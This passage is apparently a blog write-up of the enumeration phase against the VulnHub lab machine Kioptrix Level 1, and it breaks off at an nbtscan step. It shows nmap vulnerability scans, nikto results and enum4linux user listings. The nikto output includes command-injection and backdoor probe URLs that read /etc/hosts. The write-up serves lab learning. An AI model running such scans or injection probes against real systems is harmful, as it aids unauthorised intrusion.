---
layout: post
title:  Kioptrix Level 1 Writeup
categories: [vulnhub]
tags: [Writeup]
---


# Objective

Get root access via any means.

# Enumeration

Find the target ip:

```bash
└─$ sudo arp-scan -l                                                           
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:ad:36:56, IPv4: 10.10.10.129
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:ed:49:99       VMware, Inc.
10.10.10.131    00:0c:29:61:73:cd       VMware, Inc.
10.10.10.254    00:50:56:e5:1b:02       VMware, Inc.
```

The target ip is 10.10.10.131.

Detect ports, services and some known vulnerabilities:

```bash
# Nmap 7.91 scan initiated Tue Nov  1 22:51:26 2022 as: nmap -sV -p1-1023 --script vuln -oN nmap_result.txt 10.10.10.131
Nmap scan report for 10.10.10.131
Host is up (0.0025s latency).
Not shown: 1018 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| vulners: 
|   cpe:/a:openbsd:openssh:2.9p2: 
|         CVE-2002-0640    10.0    https://vulners.com/cve/CVE-2002-0640
|         CVE-2002-0639    10.0    https://vulners.com/cve/CVE-2002-0639
|         CVE-2002-0083    10.0    https://vulners.com/cve/CVE-2002-0083
|         CVE-2011-2895    9.3    https://vulners.com/cve/CVE-2011-2895
|         CVE-2006-5051    9.3    https://vulners.com/cve/CVE-2006-5051
|         CVE-2006-4924    7.8    https://vulners.com/cve/CVE-2006-4924
|         CVE-2003-1562    7.6    https://vulners.com/cve/CVE-2003-1562
|         CVE-2010-4478    7.5    https://vulners.com/cve/CVE-2010-4478
|         CVE-2002-0575    7.5    https://vulners.com/cve/CVE-2002-0575
|         CVE-2001-1459    7.5    https://vulners.com/cve/CVE-2001-1459
|         CVE-2001-1380    7.5    https://vulners.com/cve/CVE-2001-1380
|         CVE-2001-0816    7.5    https://vulners.com/cve/CVE-2001-0816
|         SECURITYVULNS:VULN:1956    7.2    https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956
|         CVE-2001-0529    7.2    https://vulners.com/cve/CVE-2001-0529
|         SSV:64479    5.0    https://vulners.com/seebug/SSV:64479    *EXPLOIT*
|         SSV:6192    5.0    https://vulners.com/seebug/SSV:6192    *EXPLOIT*
|         SSV:60656    5.0    https://vulners.com/seebug/SSV:60656    *EXPLOIT*
|         SSV:16847    5.0    https://vulners.com/seebug/SSV:16847    *EXPLOIT*
|         PACKETSTORM:73600    5.0    https://vulners.com/packetstorm/PACKETSTORM:73600    *EXPLOIT*
|         PACKETSTORM:54435    5.0    https://vulners.com/packetstorm/PACKETSTORM:54435    *EXPLOIT*
|         EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    5.0    https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    *EXPLOIT*
|         EDB-ID:3303    5.0    https://vulners.com/exploitdb/EDB-ID:3303    *EXPLOIT*
|         CVE-2010-5107    5.0    https://vulners.com/cve/CVE-2010-5107
|         CVE-2007-2243    5.0    https://vulners.com/cve/CVE-2007-2243
|         CVE-2006-5052    5.0    https://vulners.com/cve/CVE-2006-5052
|         SSV:66339    4.9    https://vulners.com/seebug/SSV:66339    *EXPLOIT*
|         SSV:10777    4.9    https://vulners.com/seebug/SSV:10777    *EXPLOIT*
|         EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    4.9    https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    *EXPLOIT*
|         EDB-ID:8163    4.9    https://vulners.com/exploitdb/EDB-ID:8163    *EXPLOIT*
|         CVE-2009-0537    4.9    https://vulners.com/cve/CVE-2009-0537
|         CVE-2012-0814    3.5    https://vulners.com/cve/CVE-2012-0814
|         CVE-2011-4327    2.1    https://vulners.com/cve/CVE-2011-4327
|         CVE-2008-3259    1.2    https://vulners.com/cve/CVE-2008-3259
|         SECURITYVULNS:VULN:1953    0.0    https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953
|         SECURITYVULNS:VULN:1608    0.0    https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608
|         SECURITYVULNS:VULN:1499    0.0    https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499
|         SECURITYVULNS:VULN:1488    0.0    https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488
|         SECURITYVULNS:VULN:1474    0.0    https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474
|         SECURITYVULNS:VULN:1439    0.0    https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439
|         SECURITYVULNS:VULN:1344    0.0    https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344
|         SECURITYVULNS:VULN:1262    0.0    https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262
|_        SECURITYVULNS:VULN:1233    0.0    https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233
80/tcp  open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /test.php: Test page
|   /icons/: Potentially interesting directory w/ listing on 'apache/1.3.20'
|   /manual/: Potentially interesting directory w/ listing on 'apache/1.3.20'
|_  /usage/: Potentially interesting folder
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
111/tcp open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1024/udp   status
139/tcp open  netbios-ssn Samba smbd (workgroup: EfKMYGROUP)
443/tcp open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.cvedetails.com/cve/2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
| ssl-dh-params: 
|   VULNERABLE:
|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
|     State: VULNERABLE
|     IDs:  BID:74733  CVE:CVE-2015-4000
|       The Transport Layer Security (TLS) protocol contains a flaw that is
|       triggered when handling Diffie-Hellman key exchanges defined with
|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
|       to downgrade the security of a TLS session to 512-bit export-grade
|       cryptography, which is significantly weaker, allowing the attacker
|       to more easily break the encryption and monitor or tamper with
|       the encrypted stream.
|     Disclosure date: 2015-5-19
|     Check results:
|       EXPORT-GRADE DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://www.securityfocus.com/bid/74733
|       https://weakdh.org
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
|   
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA
|     References:
|       https://www.securityfocus.com/bid/70574
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
|_sslv2-drown: ERROR: Script execution failed (use -d to debug)

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  1 22:56:51 2022 -- 1 IP address (1 host up) scanned in 324.87 seconds
```

Try opening web pages:

![](/img/posts/kioptrix-level-1-writeup-1.jpg)

Just a static web page, nothing more.

Use nikto to detect outdated services, directories as well as some vulnerabilities:

```bash
└─$ nikto -host 10.10.10.131 -output nikto_result.txt
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.131
+ Target Port: 80
+ GET Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-27487: GET Apache is vulnerable to XSS via the Expect header
+ HEAD mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ HEAD OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ HEAD Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+ OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-838: GET Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: GET Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+ OSVDB-2733: GET Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+ GET mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.
+ GET ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ OSVDB-682: GET /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).
+ OSVDB-3268: GET /manual/: Directory indexing found.
+ OSVDB-3092: GET /manual/: Web server manual found.
+ OSVDB-3268: GET /icons/: Directory indexing found.
+ OSVDB-3233: GET /icons/README: Apache default file found.
+ OSVDB-3092: GET /test.php: This might be interesting...
+ GET /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ GET /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ GET /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ GET /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ GET /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ GET /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ GET /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ GET /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ GET /shell?cat+/etc/hosts: A backdoor was identified.
```

This might get you a remote shell:

![](/img/posts/kioptrix-level-1-writeup-2.jpg)

I forgot to detect OS. Run again:

```bash
sudo nmap -O 10.10.10.131
Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-01 23:59 EDT
Nmap scan report for 10.10.10.131
Host is up (0.00088s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
443/tcp  open  https
1024/tcp open  kdm
MAC Address: 00:0C:29:61:73:CD (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop
```

Since it has samba service enabled, we can enumerate this via enum4linux.

```bash
$ enum4linux 10.10.10.131 > enum4linux_result.txt

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Nov  1 23:44:32 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.131
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.131    |
 ==================================================== 
[+] Got domain/workgroup name: MYGROUP

 ============================================ 
|    Nbtstat Information for 10.10.10.131    |
 ============================================ 
Looking up status of 10.10.10.131
    KIOPTRIX        <00> -         B <ACTIVE>  Workstation Service
    KIOPTRIX        <03> -         B <ACTIVE>  Messenger Service
    KIOPTRIX        <20> -         B <ACTIVE>  File Server Service
    ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
    MYGROUP         <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
    MYGROUP         <1d> -         B <ACTIVE>  Master Browser
    MYGROUP         <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

    MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 10.10.10.131    |
 ===================================== 
[+] Server 10.10.10.131 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.10.131    |
 =========================================== 
Domain Name: MYGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.10.131    |
 ====================================== 
[+] Got OS info for 10.10.10.131 from smbclient: 
[+] Got OS info for 10.10.10.131 from srvinfo:
    KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
    platform_id     :    500
    os version      :    4.5
    server type     :    0x9a03

 ============================= 
|    Users on 10.10.10.131    |
 ============================= 


 ========================================= 
|    Share Enumeration on 10.10.10.131    |
 ========================================= 

    Sharename       Type      Comment
    ---------       ----      -------
    IPC$            IPC       IPC Service (Samba Server)
    ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.

    Server               Comment
    ---------            -------
    KIOPTRIX             Samba Server

    Workgroup            Master
    ---------            -------
    MYGROUP              KIOPTRIX

[+] Attempting to map shares on 10.10.10.131
//10.10.10.131/IPC$    [E] Can't understand response:
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
//10.10.10.131/ADMIN$    [E] Can't understand response:
tree connect failed: NT_STATUS_WRONG_PASSWORD

 ==================================================== 
|    Password Policy Information for 10.10.10.131    |
 ==================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.10.131 using a NULL share

[+] Trying protocol 139/SMB...

    [!] Protocol failed: SMB SessionError: 0x5

[+] Trying protocol 445/SMB...

    [!] Protocol failed: [Errno Connection error (10.10.10.131:445)] [Errno 111] Connection refused


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 0


 ============================== 
|    Groups on 10.10.10.131    |
 ============================== 

[+] Getting builtin groups:
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Power Users] rid:[0x223]
group:[Account Operators] rid:[0x224]
group:[System Operators] rid:[0x225]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]

[+] Getting builtin group memberships:
Group 'Power Users' (RID: 547) has member: Couldn't find group Power Users
Group 'Backup Operators' (RID: 551) has member: Couldn't find group Backup Operators
Group 'Guests' (RID: 546) has member: Couldn't find group Guests
Group 'Print Operators' (RID: 550) has member: Couldn't find group Print Operators
Group 'Account Operators' (RID: 548) has member: Couldn't find group Account Operators
Group 'System Operators' (RID: 549) has member: Couldn't find group System Operators
Group 'Administrators' (RID: 544) has member: Couldn't find group Administrators
Group 'Users' (RID: 545) has member: Couldn't find group Users
Group 'Replicator' (RID: 552) has member: Couldn't find group Replicator

[+] Getting local groups:
group:[sys] rid:[0x3ef]
group:[tty] rid:[0x3f3]
group:[disk] rid:[0x3f5]
group:[mem] rid:[0x3f9]
group:[kmem] rid:[0x3fb]
group:[wheel] rid:[0x3fd]
group:[man] rid:[0x407]
group:[dip] rid:[0x439]
group:[lock] rid:[0x455]
group:[users] rid:[0x4b1]
group:[slocate] rid:[0x413]
group:[floppy] rid:[0x40f]
group:[utmp] rid:[0x415]

[+] Getting local group memberships:

[+] Getting domain groups:
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]

[+] Getting domain group memberships:
Group 'Domain Users' (RID: 513) has member: Couldn't find group Domain Users
Group 'Domain Admins' (RID: 512) has member: Couldn't find group Domain Admins

 ======================================================================= 
|    Users on 10.10.10.131 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-5-21-4157223341-3243572438-1405127623
[+] Enumerating users using SID S-1-5-21-4157223341-3243572438-1405127623 and logon username '', password ''
S-1-5-21-4157223341-3243572438-1405127623-500 KIOPTRIX\ (0)
S-1-5-21-4157223341-3243572438-1405127623-501 KIOPTRIX\ (0)
S-1-5-21-4157223341-3243572438-1405127623-502 KIOPTRIX\unix_group.2147483399 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-503 KIOPTRIX\unix_group.2147483399 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-504 KIOPTRIX\unix_group.2147483400 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-505 KIOPTRIX\unix_group.2147483400 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-506 KIOPTRIX\unix_group.2147483401 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-507 KIOPTRIX\unix_group.2147483401 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-508 KIOPTRIX\unix_group.2147483402 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-509 KIOPTRIX\unix_group.2147483402 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-510 KIOPTRIX\unix_group.2147483403 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-511 KIOPTRIX\unix_group.2147483403 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-512 KIOPTRIX\Domain Admins (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-513 KIOPTRIX\Domain Users (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-514 KIOPTRIX\Domain Guests (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-515 KIOPTRIX\unix_group.2147483405 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-516 KIOPTRIX\unix_group.2147483406 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-517 KIOPTRIX\unix_group.2147483406 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-518 KIOPTRIX\unix_group.2147483407 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-519 KIOPTRIX\unix_group.2147483407 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-520 KIOPTRIX\unix_group.2147483408 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-521 KIOPTRIX\unix_group.2147483408 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-522 KIOPTRIX\unix_group.2147483409 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-523 KIOPTRIX\unix_group.2147483409 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-524 KIOPTRIX\unix_group.2147483410 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-525 KIOPTRIX\unix_group.2147483410 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-526 KIOPTRIX\unix_group.2147483411 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-527 KIOPTRIX\unix_group.2147483411 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-528 KIOPTRIX\unix_group.2147483412 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-529 KIOPTRIX\unix_group.2147483412 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-530 KIOPTRIX\unix_group.2147483413 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-531 KIOPTRIX\unix_group.2147483413 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-532 KIOPTRIX\unix_group.2147483414 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-533 KIOPTRIX\unix_group.2147483414 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-534 KIOPTRIX\unix_group.2147483415 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-535 KIOPTRIX\unix_group.2147483415 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-536 KIOPTRIX\unix_group.2147483416 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-537 KIOPTRIX\unix_group.2147483416 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-538 KIOPTRIX\unix_group.2147483417 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-539 KIOPTRIX\unix_group.2147483417 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-540 KIOPTRIX\unix_group.2147483418 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-541 KIOPTRIX\unix_group.2147483418 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-542 KIOPTRIX\unix_group.2147483419 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-543 KIOPTRIX\unix_group.2147483419 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-544 KIOPTRIX\unix_group.2147483420 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-545 KIOPTRIX\unix_group.2147483420 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-546 KIOPTRIX\unix_group.2147483421 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-547 KIOPTRIX\unix_group.2147483421 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-548 KIOPTRIX\unix_group.2147483422 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-549 KIOPTRIX\unix_group.2147483422 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-550 KIOPTRIX\unix_group.2147483423 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\root (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1001 KIOPTRIX\root (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1002 KIOPTRIX\bin (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1003 KIOPTRIX\bin (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1004 KIOPTRIX\daemon (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1005 KIOPTRIX\daemon (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1006 KIOPTRIX\adm (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1007 KIOPTRIX\sys (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1008 KIOPTRIX\lp (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1009 KIOPTRIX\adm (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1010 KIOPTRIX\sync (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1011 KIOPTRIX\tty (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1012 KIOPTRIX\shutdown (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1013 KIOPTRIX\disk (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1014 KIOPTRIX\halt (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1015 KIOPTRIX\lp (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1016 KIOPTRIX\mail (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1017 KIOPTRIX\mem (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1018 KIOPTRIX\news (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1019 KIOPTRIX\kmem (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1020 KIOPTRIX\uucp (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1021 KIOPTRIX\wheel (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1022 KIOPTRIX\operator (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1023 KIOPTRIX\unix_group.11 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1024 KIOPTRIX\games (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1025 KIOPTRIX\mail (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1026 KIOPTRIX\gopher (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1027 KIOPTRIX\news (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1028 KIOPTRIX\ftp (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1029 KIOPTRIX\uucp (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1030 KIOPTRIX\unix_user.15 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1031 KIOPTRIX\man (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1032 KIOPTRIX\unix_user.16 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1033 KIOPTRIX\unix_group.16 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1034 KIOPTRIX\unix_user.17 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1035 KIOPTRIX\unix_group.17 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1036 KIOPTRIX\unix_user.18 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1037 KIOPTRIX\unix_group.18 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1038 KIOPTRIX\unix_user.19 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1039 KIOPTRIX\floppy (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1040 KIOPTRIX\unix_user.20 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1041 KIOPTRIX\games (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1042 KIOPTRIX\unix_user.21 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1043 KIOPTRIX\slocate (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1044 KIOPTRIX\unix_user.22 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1045 KIOPTRIX\utmp (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1046 KIOPTRIX\squid (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1047 KIOPTRIX\squid (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1048 KIOPTRIX\unix_user.24 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1049 KIOPTRIX\unix_group.24 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\unix_user.25 (Local User)

 ============================================= 
|    Getting printer info for 10.10.10.131    |
 ============================================= 
No printers returned.


enum4linux complete on Tue Nov  1 23:44:39 2022
```

This might be interesting:

![](/img/posts/kioptrix-level-1-writeup-3.jpg)

Also we can use nbtscan for samba service:

```bash

Doing NBT name scan for addresses from 10.10.10.131

